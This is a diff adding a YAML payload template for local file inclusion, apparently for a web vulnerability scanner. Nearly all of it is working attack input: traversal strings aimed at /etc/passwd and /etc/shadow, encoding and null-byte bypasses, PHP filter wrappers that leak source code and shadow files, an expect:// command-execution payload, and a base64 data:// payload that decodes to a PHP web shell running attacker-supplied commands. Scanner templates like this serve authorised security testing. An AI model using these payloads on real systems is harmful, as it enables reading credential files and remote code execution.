@@ -1,0 +1,41 @@
+id: lfi
+name: Local File Inclusion
+severity_range: [medium, critical]
+
+injection_points:
+  - file_parameters
+  - template_parameters
+  - include_parameters
+
+payloads:
+  basic:
+    - "../../../etc/passwd"
+    - "....//....//....//etc/passwd"
+    - "../../../etc/shadow"
+    - "../../../etc/hosts"
+    - "..\\..\\..\\windows\\win.ini"
+
+  encoding_bypass:
+    url_encode: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    double_encode: "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+    utf8: "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+    null_byte: "../../../etc/passwd%00"
+
+  php_wrappers:
+    - "php://filter/read=string.rot13/resource=config.php"
+    - "php://filter/convert.base64-encode/resource=config.php"
+    - "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/shadow"
+    - "php://input"
+    - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
+    - "expect://ls"
+
+  path_tricks:
+    - "....//....//etc/passwd"
+    - "..///////..////..//////etc/passwd"
+    - "/%5C../%5C../%5C../%5C../etc/passwd"
+    - "/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+
+detection:
+  file_content: "response contains known file content (root:x:0:0 for /etc/passwd)"
+  error_messages: "file not found or permission denied errors"
+  php_filter: "base64-encoded source code in response"
